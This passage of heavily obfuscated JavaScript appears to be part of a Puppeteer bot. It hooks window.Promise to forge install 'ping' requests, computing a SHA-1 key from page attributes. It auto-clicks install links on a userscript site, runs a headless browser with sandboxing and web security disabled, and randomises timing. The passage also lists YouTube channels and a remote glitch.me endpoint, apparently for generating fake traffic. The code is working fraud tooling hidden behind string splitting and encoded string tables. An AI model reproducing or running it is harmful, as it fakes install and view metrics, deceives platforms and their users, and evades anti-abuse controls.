                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x1403 + 0x2315 + -0x1 * 0xf0d | L >>> -0x14c2 + 0xc66 + 0x877) + (M & N | ~M & O) + P + (-0x15f7a191 + 0x11 * -0x239d32d + 0x96512127) + Q[J] << 0x1b10 + 0x5e7 * 0x1 + -0x20f7) << 0x17fc + 0xdbf + -0x12db * 0x2 | P >>> -0x25 * -0x76 + -0x615 + -0x2 * 0x56f) + (L & (M = M << -0x1 * 0x101f + 0x2023 * -0x1 + 0x60c * 0x8 | M >>> -0x314 * 0x6 + 0x1 * -0x1d63 + -0x2fdd * -0x1) | ~L & N) + O + (-0x12 * -0x283b12c + -0x8291948a + 0xafd1990b) + Q[J + (0x4f8 + 0xf90 + -0x1487)] << 0x72b * 0x2 + 0xe * -0xd4 + -0x2 * 0x15f) << 0x1 * -0x1b2 + 0xd8f + -0x8 * 0x17b | O >>> 0x11d3 + -0xe71 + -0x1 * 0x347) + (P & (L = L << -0x1226 + 0x1b2d + -0x8e9 | L >>> -0xd4a + -0x3 * 0x8 + 0xd64) | ~P & M) + N + (-0x90eef337 * -0x1 + 0x9ed46ad + -0x166d * 0x2de97) + Q[J + (0x8 * -0x1aa + 0x62 * -0x43 + 0x9be * 0x4)] << 0x1a6 * 0x3 + -0x132e + 0xe3c) << -0x1 * 0xe8f + 0x8a3 + -0x1 * -0x5f1 | N >>> -0x2 * -0x35a + -0x821 + -0x31 * -0x8) + (O & (P = P << 0x1de6 + -0xee9 + -0x4f5 * 0x3 | P >>> 0x1522 + 0x1c5 + -0x16e5) | ~O & L) + M + (0x18b97d * 0x1fc + 0xe * -0x9d1432b + -0x3ba15b4d * -0x3) + Q[J + (-0x202c + 0x4 * -0x47b + 0x321b)] << 0x5b * 0xa + 0x18cc + -0x1c5a) << 0x284 + 0x2234 + 0x757 * -0x5 | M >>> 0x12d6 + -0x11ef * -0x2 + -0x3699) + (N & (O = O << 0x1 * 0x201b + -0x237b + 0x37e | O >>> -0xa84 * -0x1 + 0x2ab * 0x3 + -0x2a5 * 0x7) | ~N & P) + L + (-0x1ad2b2 * -0x32e + -0x1 * -0x9bbe2643 + -0x96859ea6) + Q[J + (-0x1 * 0x174e + -0x179b + -0x29 * -0x125)] << -0x1c21 * 0x1 + -0x4 * -0x60a + 0x153 * 0x3, N = N << 0x3 * 0xccf + -0x1a21 * 0x1 + -0x617 * 0x2 | N >>> -0x31 * -0x45 + -0xd49 + 0x16;
              for (; J < 0x58 * 0x5b + 0x638 * 0x1 + -0x2558 * 0x1; J += -0x2623 + -0xa91 * -0x3 + 0x39 * 0x1d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4 * 0x25f + -0x17d2 + 0xe5b | L >>> 0xe77 * -0x1 + 0x9b1 * 0x4 + -0x1832) + (M ^ N ^ O) + P + (0x20 * -0x4084ba + -0x5cae1 * -0x20b1 + 0x1d8 * -0x2635a2) + Q[J] << 0x1 * 0x5e5 + -0x44 * -0x1 + -0x629) << -0x1 * 0x99f + 0xc4f + -0x2ab | P >>> -0xc * -0x65 + 0x1a67 + 0x3e1 * -0x8) + (L ^ (M = M << -0x78 * -0x4c + -0x10f3 * -0x2 + -0x4568 | M >>> 0x1509 * 0x1 + 0x73a * -0x1 + 0x1 * -0xdcd) ^ N) + O + (0x15179664 * -0x2 + 0x32aad717 + 0x1d * 0x387a9fa) + Q[J + (-0xf24 + 0x1afe * -0x1 + 0x2a23)] << 0x1f11 + -0x82 * -0x11 + 0x27b3 * -0x1) << 0x4d5 + -0x1 * 0x572 + -0x3 * -0x36 | O >>> 0xc64 + 0x6f * 0x24 + 0xc1 * -0x25) + (P ^ (L = L << 0x160d + -0xb * -0xbb + -0x1df8 | L >>> -0x64c + -0x1ec3 + 0x2511 * 0x1) ^ M) + N + (0x23aa4210 + -0xab6e4397 + 0xf69ded28) + Q[J + (0x1 * -0xe13 + -0x1b09 + -0x1 * -0x291e)] << -0x1 * -0x2ff + 0x7 * 0x1f6 + -0x10b9) << -0x26 * -0xcf + 0x1af0 * 0x1 + -0x39a5 | N >>> -0x1 * -0x26ad + -0xa47 + 0x1 * -0x1c4b) + (O ^ (P = P << -0x1389 + 0x7 * -0x3f5 + 0x2f5a | P >>> -0x1 * 0x1460 + -0x16a6 + -0x51 * -0x88) ^ L) + M + (0x2dd44a56 * 0x1 + 0xa99f0ba4 * -0x1 + 0xeaa4acef) + Q[J + (0x624 + 0x1343 + 0xa * -0x28a)] << -0xea5 + -0x234 + -0x13 * -0xe3) << -0x3d3 * -0x2 + -0xb02 * 0x1 + 0x1 * 0x361 | M >>> 0xd4f * -0x1 + 0xb5 * -0x1a + 0x4a * 0x6e) + (N ^ (O = O << -0xb3 * -0x2d + -0x128f + 0x1 * -0xcca | O >>> 0x3fd * -0x3 + 0x1edf + -0x12e6) ^ P) + L + (-0x83adbd97 + 0x1 * 0xa09705c3 + -0x7 * -0xbb4a9a3) + Q[J + (0x1 * -0x254a + -0x2330 + 0x12 * 0x407)] << 0x11de + -0xfad + -0x231, N = N << 0x1a98 * -0x1 + 0x1162 + 0x954 | N >>> -0x2474 + 0x2643 + -0x1cd * 0x1;
              for (; J < -0xbd1 + 0x11fc + -0x5ef; J += 0xd55 * 0x1 + 0x1931 * -0x1 + 0x1 * 0xbe1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xd * -0x154 + -0x7b * 0x2b + -0x17 * -0x26 | L >>> 0x3 * -0xa37 + 0x313 * -0xa + -0x22 * -0x1cf) + (M & N | M & O | N & O) + P - (0xa80ca76a + 0x35b13a62 + -0x6cd99ea8) + Q[J] << 0x2675 + -0xa93 * -0x2 + 0x3b9b * -0x1) << 0x43 * 0x5 + -0x5 * -0x388 + 0x19 * -0xc2 | P >>> 0x186e * -0x1 + 0x169 + -0x5 * -0x4a0) + (L & (M = M << -0x13b4 + -0x3a * -0x5 + 0x12b0 | M >>> -0x7b * -0x4f + -0x9ce + -0x1c25) | L & N | M & N) + O - (0xc71f * 0x84d6 + 0x7 * -0x1569733c + 0x4fb9fcef * 0x2) + Q[J + (0x49d * -0x3 + 0x249c + 0x3e * -0x5e)] << -0x105b + -0xb3c * 0x3 + 0x320f) << 0xaf + 0x8c3 + 0x1 * -0x96d | O >>> 0xb13 + -0x2392 + -0x86 * -0x2f) + (P & (L = L << 0x1 * 0x219e + 0x7 * -0x416 + -0x4e6 | L >>> -0x1 * 0x107 + 0x25ef + -0x1 * 0x24e6) | P & M | L & M) + N - (0x1a0bb5 * -0x272 + -0xe6 * -0xe52226 + -0x86 * 0x37f051) + Q[J + (0x925 * -0x2 + 0xf74 + 0x7 * 0x68)] << 0x13 * 0xbf + -0x133d + 0x510) << 0x1808 + 0x19a * -0xd + -0x2b * 0x13 | N >>> -0xde3 + 0x1 * -0x68 + 0xe66) + (O & (P = P << -0x1cbd + 0x2 * -0x52f + 0x2739 | P >>> 0x8d * -0x14 + 0x38f * 0x1 + -0x31 * -0x27) | O & L | P & L) + M - (0xd420594 * 0xb + 0x7ef840f4 + -0x9fea3b2c) + Q[J + (0xce + 0x7 * -0xef + 0x3 * 0x1ea)] << -0x2f * 0x46 + 0x17fb + 0x25 * -0x4d) << 0xaf2 + -0x7 * 0x3d + -0x942 * 0x1 | M >>> -0xf6d + 0x1 * -0xa8b + 0x1a13) + (N & (O = O << -0x2 * 0x59f + 0x486 + -0x2 * -0x36b | O >>> 0x1748 + -0x1 * -0x11ab + -0x28f1) | N & P | O & P) + L - (0x435fe3 * 0x316 + 0x8f262eb6 * -0x1 + 0x30208b58) + Q[J + (-0x12d8 + -0x2479 + 0xb11 * 0x5)] << -0x17cc + 0xb73 * 0x1 + -0x1 * -0xc59, N = N << 0x6d1 * -0x3 + 0x448 + -0x1 * -0x1049 | N >>> 0xcc6 + 0xa45 * 0x3 + 0x61 * -0x73;
              for (; J < -0x357 + -0xc6b * 0x3 + 0x1474 * 0x2; J += -0x63c + 0x1904 + -0x12c3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1042 + 0x3 * 0x83 + 0x32 * -0x5b | L >>> -0x10e3 + 0x1eb5 + 0xdb7 * -0x1) + (M ^ N ^ O) + P - (0x601a9bbc + -0x1 * -0x30bc8f07 + -0x5b39ec99) + Q[J] << 0x2393 + -0x6a4 * 0x5 + -0x25f) << 0x215 * -0xe + -0x24b + 0xfbb * 0x2 | P >>> -0x15d9 + 0x1a8b + -0x497) + (L ^ (M = M << -0x24c7 + -0x627 + -0xa * -0x44e | M >>> -0x3 * 0x6bb + -0xa83 + 0xf5b * 0x2) ^ N) + O - (-0x2bf * -0x21d9c1 + -0xe12d80d + -0x4af28 * 0x565) + Q[J + (0x11 * 0x19 + 0x64 * -0x2 + -0xe0)] << -0x1 * -0x471 + -0x2af * -0x5 + 0x9 * -0x1fc) << 0x63 + 0x1f3d + -0x1f9b | O >>> 0x225c + 0x5f6 + -0x1d * 0x163) + (P ^ (L = L << -0x22d5 + 0x887 * 0x3 + -0x16 * -0x6d | L >>> 0x6ee + -0x2 * 0xed0 + 0x16b4) ^ M) + N - (0x512c705 + 0xe80466b * 0x1 + 0x1 * 0x220a30ba) + Q[J + (-0x20da + 0x9 * 0x75 + -0xb * -0x29d)] << 0x179b + 0x3f1 + -0x1b8c) << -0xc24 + 0xd3e + -0x115 | N >>> -0x8b * -0x3e + -0xd4d + -0x1442) + (O ^ (P = P << 0xc7 * -0x1d + -0x24c3 * 0x1 + 0x4 * 0xedb | P >>> 0x19ea + 0x1c9c + -0x1 * 0x3684) ^ L) + M - (0x3b5ab3e2 + -0x1c5dc81e * 0x3 + 0x4f5be2a2) + Q[J + (-0x1862 + 0x143d * 0x1 + -0x7 * -0x98)] << 0xe * 0x166 + 0x134a + -0x1 * 0x26de) << 0xeb * 0x25 + -0x1 * -0x22fd + -0x1 * 0x44ef | M >>> 0x2654 + -0x1766 * 0x1 + -0x4f1 * 0x3) + (N ^ (O = O << -0x1f9e + -0x79 * 0x37 + -0x1 * -0x39bb | O >>> -0xff9 * 0x2 + -0x262d * 0x1 + 0x4621) ^ P) + L - (-0x11e5cea1 * -0x5 + -0x1 * -0x5478a426 + -0x78586f21) + Q[J + (-0xef6 + -0x414 * 0x8 + 0x2 * 0x17cd)] << 0x1 * 0x1a3f + 0x43 * 0x47 + -0x4c * 0x97, N = N << -0x1 * 0x9d3 + -0x466 + -0x1 * -0xe57 | N >>> -0x9 * -0x16 + 0xcd3 * 0x1 + -0xd97;
              this['h0'] = this['h0'] + L << 0x1 * -0x1f05 + -0x17c3 + 0x36c8, this['h1'] = this['h1'] + M << 0x4cc + -0x1 * 0x33b + 0x191 * -0x1, this['h2'] = this['h2'] + N << 0x1 * 0x5c + 0xc75 + -0x11 * 0xc1, this['h3'] = this['h3'] + O << 0x208 * 0xa + -0x34a * -0x9 + -0x31ea, this['h4'] = this['h4'] + P << 0x2033 * 0x1 + -0x16a7 + -0x98c;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2f * 0xa9 + -0x2fb + 0x31a * 0xb & 0x1579 + -0x1720 + 0x1 * 0x1b6] + w[J >> -0x19f3 * -0x1 + 0x25c1 + -0x3f9c & 0x331 * 0x3 + 0x1 * 0xb01 + -0x1485] + w[J >> 0x1a36 + -0x3c8 + 0x2 * -0xb2d & 0x1a39 + -0x2 * -0x281 + -0x214 * 0xf] + w[J >> 0x1 * -0x1441 + 0x1c1d + -0x7cc & 0x59 * -0x52 + -0xf60 + -0x2bf1 * -0x1] + w[J >> -0x2 * 0x3fa + 0x7f8 + 0x1 * 0x8 & -0x1 * 0x825 + 0xbf * -0x2b + 0x2849] + w[J >> -0x1 * 0x1a03 + 0x227f + 0x21d * -0x4 & -0x16c4 + 0x7 * -0xbb + 0x950 * 0x3] + w[J >> 0x99e * 0x1 + 0xf30 + -0x18ca & -0x125d + -0x20a4 + 0x3310] + w[0x64 * -0x53 + 0x1d2a + 0x1 * 0x351 & J] + w[K >> 0x3 * 0xbac + 0x1102 + 0xf * -0x376 & -0x21c7 + 0x105b + 0x117b] + w[K >> 0xa8f + -0x2 * 0x498 + 0x3 * -0x6d & -0x20e9 * -0x1 + -0x1b78 + -0x562] + w[K >> 0x13ca + -0x1 * -0x221b + 0x1 * -0x35d1 & 0x2255 + 0x25d7 * -0x1 + 0x53 * 0xb] + w[K >> -0x976 + 0x11b7 * 0x2 + 0x67a * -0x4 & -0x2f3 * 0x8 + -0x1 * 0x20ed + -0x1aa * -0x22] + w[K >> 0x190c + -0x16e7 + 0x3 * -0xb3 & -0x2 * -0xec + -0x1fb7 + 0x1dee] + w[K >> -0xbc3 * 0x1 + 0x647 + 0x2c2 * 0x2 & -0x115 + 0x403 * -0x5 + 0x1533] + w[K >> -0x1bb2 + -0x1226 + 0x2ddc & 0x2c7 + 0xb2c + -0xde4] + w[0x1b * -0x74 + 0x1a6e + -0xe23 & K] + w[L >> -0x2167 + 0x5 * 0x2b + 0x4 * 0x82b & 0x288 * -0x8 + -0x7 * -0x259 + 0x3e0] + w[L >> -0x24f5 + 0x1a52 + 0xabb & 0x1a4e + 0x2333 + -0x3d72] + w[L >> -0x2218 + -0x1 * -0x232 + 0x1ffa & -0x3 * -0x18d + -0x3be * -0x1 + -0x856] + w[L >> -0xc * 0x2e3 + 0x1 * -0x14bd + 0x3771 & -0x38f * 0x2 + 0x1156 + -0x1 * 0xa29] + w[L >> -0x1035 + -0x15fa + 0x263b & -0x24bc + -0x1a * 0x7 + 0x2581] + w[L >> -0x2471 + -0xb42 + 0x2fbb * 0x1 & -0x3 * -0x96b + 0xc88 * 0x2 + -0x3542] + w[L >> -0x21be + 0x263e + -0x7 * 0xa4 & 0x13e9 + 0xb * -0x362 + -0x4 * -0x457] + w[0x38c + 0x14b1 + -0x2 * 0xc17 & L] + w[M >> 0x1 * 0x2c7 + 0xe13 * -0x1 + -0x1 * -0xb68 & 0x1548 * 0x1 + 0x2f3 + -0xee * 0x1a] + w[M >> 0xd00 + 0x1e4e + 0x159b * -0x2 & 0x1 * -0x238a + 0xc7 * 0xc + -0x541 * -0x5] + w[M >> 0xcfb + -0x178f + 0x2c * 0x3e & -0x7 * -0x49a + -0x2684 + 0x21f * 0x3] + w[M >> -0x1327 + 0x2591 + 0x1b * -0xae & 0x90e + 0x1c55 + -0x2554] + w[M >> 0x1e3 * 0x14 + -0x1 * 0x2605 + 0x55 * 0x1 & -0x25af + 0x16a9 + 0xf15] + w[M >> -0x3d + -0x49 * 0x5 + 0x1f * 0xe & 0x10f1 + 0x12b6 * 0x1 + -0x2398] + w[M >> 0x1d79 + 0x246b + -0x41e0 & -0x241 + -0x1 * 0x143b + 0x1 * 0x168b] + w[-0x4d * 0x19 + 0x37 * 0x6a + 0x1 * -0xf32 & M] + w[N >> 0x1 * -0x5e7 + 0x20bd + -0xb * 0x26e & -0x1cee + -0x19c8 + 0x7 * 0x7d3] + w[N >> -0x1 * 0x1a1a + -0x1 * -0xb99 + 0xe99 & 0x1b * -0xf9 + 0x1f7b + -0x1 * 0x529] + w[N >> 0x204f + 0xe36 + -0x2e71 & 0xbcc + 0x867 + -0x1424] + w[N >> -0xb5b + 0x1cca + -0x1 * 0x115f & -0x1cec * 0x1 + -0x1e4 + 0x469 * 0x7] + w[N >> 0x779 + -0x183f * 0x1 + 0x10d2 & 0xa97 * 0x1 + -0x60e + 0x17e * -0x3] + w[N >> -0x3c3 * -0x1 + -0x9a0 + -0x3 * -0x1f7 & -0x2603 + 0x2250 + 0x1 * 0x3c2] + w[N >> 0x9e3 + 0x1a63 + -0x2442 & -0x93c * 0x1 + -0x11bb + 0x1b06] + w[-0x108b + -0x5e2 + 0x167c & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xe3 * -0x10 + -0x1be9 + 0x7 * 0x607 & -0x5 * 0xab + 0x1e * -0x43 + 0xc30,
                J >> 0x20ca + 0xdbb * -0x2 + -0x544 & 0x2202 + -0xc5d + -0x14a6,
                J >> 0x7a2 + 0x13 * 0xb5 + -0x1509 & 0x8 * 0x1b4 + 0x1 * 0x26b + -0xf0c,
                0x1f93 + 0x236 * 0xa + 0x8c8 * -0x6 & J,
                K >> 0x1eb8 + -0x7 * -0x37d + -0x501 * 0xb & 0x2e * 0x4c + -0x1 * 0x26a4 + 0x19fb,
                K >> -0xbb * -0x10 + 0x1 * 0x130d + -0x1ead & -0x1bf * -0xb + -0x1f71 + 0xd3b,
                K >> 0xda + 0x644 * -0x2 + 0xbb6 & 0x19 * 0x18b + -0xe29 + 0x5 * -0x4af,
                0x20b9 + -0x1 * -0x76d + -0x2727 & K,
                L >> -0x32e + 0x578 + -0x232 & -0x61 * -0x7 + 0x1c13 + 0x2b * -0xb1,
                L >> 0x1aa * -0x11 + -0x17f * 0xb + 0x2ccf & -0x2043 + -0x1fa5 * 0x1 + 0x40e7,
                L >> -0x806 + -0x1453 + -0x5 * -0x5ad & -0xa * -0xa1 + -0x115 * 0x1 + -0x436,
                0xd * 0x20b + 0x9fd + 0x13 * -0x1df & L,
                M >> -0x18 * -0xb6 + 0x1cf + -0x12c7 & -0x1326 + 0x7c0 + 0x1 * 0xc65,
                M >> 0x12b6 + 0x8f6 + -0x26 * 0xba & -0x5c * -0x1b + -0xc2 * 0x19 + 0x1 * 0xa3d,
                M >> 0x3 * 0x563 + 0x73 + 0x1 * -0x1094 & 0x6ac + 0x12a1 + -0x7a * 0x33,
                0x7be * 0x1 + 0x165e + 0x1d * -0x101 & M,
                N >> 0x21b4 + 0x1014 + -0x31b0 & -0xa26 * 0x1 + -0x4 * 0x38b + -0x1 * -0x1951,
                N >> -0x3 * -0xb19 + -0xb * 0x12e + -0x1441 & 0x924 + -0xf42 + 0x71d,
                N >> -0x77b + -0x6a0 + -0x7 * -0x205 & -0x2ea * -0x9 + 0x11b0 + -0x2aeb * 0x1,
                0x2269 + 0x1b65 + -0x3ccf & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x17d5 + 0x9d * -0x3a + 0xbd1), (K = new DataView(J))['setUint32'](0xf61 * 0x2 + 0xb45 + -0x2a07, this['h0']), K['setUint32'](0x2189 + 0xe08 * 0x1 + 0x2f * -0x103, this['h1']), K['setUint32'](-0x115a + 0x51b * 0x1 + -0x7 * -0x1c1, this['h2']), K['setUint32'](0x1 * -0x7ef + -0xfe4 + -0x3 * -0x7f5, this['h3']), K['setUint32'](0x185 * 0x11 + -0x12d1 + -0x1bd * 0x4, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x3 * -0x25d + 0x1da9 + -0x1692];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1a * 0x3e + -0x1957 + -0x485 * -0x7;
            J[0x18f7 + 0x1ce8 + -0x35df]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x23f2 + -0x1 * -0x1ced + 0x705] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x2 * 0xe09 + -0x31a * 0xc + 0x414b), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1da5 + -0x1c3d + 0x39e3;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x49 * -0x19 + 0x193d + -0x1a82), Promise['resolve'](-0x5e2 + -0x1bb5 * 0x1 + 0x2198);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0xa81 + -0x24eb + 0x2f6c * 0x1; j < 0x2f9 * 0x6 + -0x71e + 0xab7 * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x28b0 + -0x1830 + 0xec0 + (-0x1c2b * 0x1 + -0x90f + 0x46 * 0xb3) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1a3 * 0x1 + 0x18dd + -0x1a7d) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + V(0x10, 'F$MS') + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x140f + -0x323 + -0x10ec);
    let h = e[f];
    if (c['GpapEz'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xd73 + 0x2045 + 0x969 * -0x2, r, s, t = 0xf3d * 0x2 + -0x26c9 * -0x1 + -0x4543; s = m['charAt'](t++); ~s && (r = q % (-0x23f + 0x685 * -0x3 + 0x15d2 * 0x1) ? r * (-0x3a1 + 0x17d1 + -0x13f0) + s : s, q++ % (0x1 * 0x2bd + 0x1a5b + 0x1d14 * -0x1)) ? o += String['fromCharCode'](0xd3e + -0x9e9 * 0x1 + -0x2e * 0xd & r >> (-(-0x1 * 0x1dc5 + 0x566 * -0x3 + 0xf53 * 0x3) * q & 0x5 * -0x1f7 + 0x1b56 * 0x1 + -0x1 * 0x117d)) : 0x15ca + 0x9c6 + -0x1f90) {
          s = n['indexOf'](s);
        }
        for (let u = 0x22a1 + -0x149 + -0x308 * 0xb, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1 * 0x114b + -0x2690 + -0x1555 * -0x1))['slice'](-(-0xeb * -0x14 + 0x1 * -0x2161 + 0xf07));
        }
        return decodeURIComponent(p);
      };
      c['OkEDxC'] = i, b = arguments, c['GpapEz'] = !![];
    }
    const j = e[-0x401 + 0x124 * -0x5 + 0x9b5],
      k = f + j,
      l = b[k];
    return !l ? (h = c['OkEDxC'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x2 * 0x81a + 0x75e + 0x57 * 0x1a; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x140f + -0x323 + -0x10ec);
    let h = e[f];
    if (b['htnwVP'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xd73 + 0x2045 + 0x969 * -0x2, s, t, u = 0xf3d * 0x2 + -0x26c9 * -0x1 + -0x4543; t = n['charAt'](u++); ~t && (s = r % (-0x23f + 0x685 * -0x3 + 0x15d2 * 0x1) ? s * (-0x3a1 + 0x17d1 + -0x13f0) + t : t, r++ % (0x1 * 0x2bd + 0x1a5b + 0x1d14 * -0x1)) ? p += String['fromCharCode'](0xd3e + -0x9e9 * 0x1 + -0x2e * 0xd & s >> (-(-0x1 * 0x1dc5 + 0x566 * -0x3 + 0xf53 * 0x3) * r & 0x5 * -0x1f7 + 0x1b56 * 0x1 + -0x1 * 0x117d)) : 0x15ca + 0x9c6 + -0x1f90) {
          t = o['indexOf'](t);
        }
        for (let v = 0x22a1 + -0x149 + -0x308 * 0xb, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1 * 0x114b + -0x2690 + -0x1555 * -0x1))['slice'](-(-0xeb * -0x14 + 0x1 * -0x2161 + 0xf07));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x401 + 0x124 * -0x5 + 0x9b5,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x21ac + 0x225a + -0x4406; u < -0x1 * -0x221c + -0xae8 * -0x1 + -0x2c04; u++) {
          p[u] = u;
        }
        for (u = -0x13 * 0x1c1 + -0x2 * -0x3e6 + 0x1 * 0x1987; u < 0x2 * -0x649 + 0x1daf + -0x101d; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x18f9 * -0x1 + 0x12fd * 0x1 + -0x2af6), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xc96 + -0x1ccd + -0x32f * -0xd, q = -0x9bc + 0x2441 + 0x1 * -0x1a85;
        for (let v = 0x6c9 * -0x1 + 0x37c + 0x34d; v < n['length']; v++) {
          u = (u + (-0x2 * -0xdb + 0x686 + -0x83b)) % (0xf62 + -0xd6 * 0x26 + 0x1162), q = (q + p[u]) % (-0x2249 + 0x871 + -0x1 * -0x1ad8), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x16da + -0x509 * 0x1 + 0x1d * 0xff)]);
        }
        return t;
      };
      b['VCdjKx'] = m, c = arguments, b['htnwVP'] = !![];
    }
    const j = e[0x5b4 + -0x1887 + 0x12d3],
      k = f + j,
      l = c[k];
    return !l ? (b['MEylab'] === undefined && (b['MEylab'] = !![]), h = b['VCdjKx'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let searchTerms = [];

function a() {
  const bl = [
    '/Bloggerpe',
    'WPpdLJ3dPtddPMayWRNdIq',
    'eg/cGbZcIZfkW73cIxm',
    'y3jPChq',
    'youtube-hi',
    'oCoaj8oYkvK',
    'WP4pWO3cHLv7W5tcNMBcSW',
    'buffer',
    'WPrDkYfXWPBdJSoTv2e',
    'gM/dHSoKW6Gvna3dGgG',
    'enuserjs.o',
    'eta',
    'qSk9WO7cMCkoCg5fEhi',
    'ohdcOCoKbtPEFbW7',
    'rKtcOCk7W4FcICk/W5r+iq',
    'z2fJyw1Zs2LSBa',
    'tmk7WPFdMSkRuwr7ueC',
    'WPtdIcxdJSosuL4pW7/cVq',
    'rvxcPSovWOddHCo8WOSKzG',
    'rg/en/scri',
    'mJu4yNrpng1gDW',
    'l3BcIG3cU2FdGqHkWRO',
    's34/nNWcW63dJSohWRy',
    'ECodE8o3DGhdQa',
    'CgXtExjiCvvOnW',
    'ENrFzxvIsfDOEa',
    'oc4WlJuZntKUmq',
    'browser\x20la',
    'd0xcV8kGWPStBMFcOqK'
  ];
  a = function() {
    return bl;
  };
  return a();
}
